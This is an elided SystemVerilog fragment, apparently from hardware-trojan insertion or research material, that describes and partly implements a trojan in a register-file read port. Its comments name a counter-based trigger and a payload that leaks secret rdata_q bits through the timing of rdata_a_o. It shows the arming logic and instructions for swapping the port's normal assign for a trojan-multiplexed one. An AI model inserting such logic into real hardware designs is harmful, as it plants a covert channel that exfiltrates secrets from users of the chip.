 ...
 *   
 * Trigger: Counter on rdata_a_o
 * Payload: Modulate rdata_a_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |rdata_a_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of rdata_a_o:
...
logic       covert_bit_out;         // Drives rdata_a_o when trojan active
...
//   Find the assign for rdata_a_o (or rd_error_o as fallback):
//     assign rdata_a_o = <normal_expr>;
//   Replace with:
//     assign rdata_a_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
